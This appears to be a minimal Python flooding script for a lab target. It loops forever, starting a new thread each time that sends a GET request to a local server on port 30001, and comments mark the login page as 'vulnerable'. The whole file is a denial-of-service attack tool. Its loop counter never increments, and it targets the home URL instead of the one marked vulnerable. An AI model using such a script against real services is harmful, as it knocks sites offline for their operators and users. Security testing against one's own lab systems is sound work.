import requests
import threading

url = 'http://localhost:30001/login' #vulnerable
home = 'http://localhost:30001/' #not work

def request_task(t):
    requests.get(t)


def fire_and_forget(url):
    threading.Thread(target=request_task, kwargs={"t":url}).start()

i = 0

while True:
    print(i)
    fire_and_forget(home)
